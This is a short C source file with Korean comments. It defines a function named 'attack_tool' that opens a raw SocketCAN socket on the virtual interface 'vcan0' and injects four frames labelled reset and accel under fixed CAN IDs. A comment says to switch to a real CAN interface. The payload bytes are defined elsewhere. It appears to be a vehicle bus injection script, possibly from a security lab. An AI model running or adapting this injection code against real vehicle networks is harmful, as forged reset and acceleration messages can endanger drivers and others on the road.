#include "all-headrs.h"


int attack_tool() {
    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;

    // 소켓 생성
    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
        perror("Socket creation error");
        return 1;
    }

    // 인터페이스 이름 설정 (vcan0 또는 실제 CAN 인터페이스 이름으로 변경)
    strcpy(ifr.ifr_name, "vcan0");
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX error");
        return 1;
    }

    // 소켓 주소 설정
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    // 소켓 바인딩
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Socket binding error");
        return 1;
    }

    // 원하는 페이로드 선택하여 전송
    send_can_packet(s, &addr, msq.reset1, sizeof(msq.reset1), 0x100);
    send_can_packet(s, &addr, msq.reset2, sizeof(msq.reset2), 0x101);
    send_can_packet(s, &addr, msq.accel1, sizeof(msq.accel1), 0x200);
    send_can_packet(s, &addr, msq.accel2, sizeof(msq.accel2), 0x201);

    // 소켓 닫기
    close(s);

    return 0;
}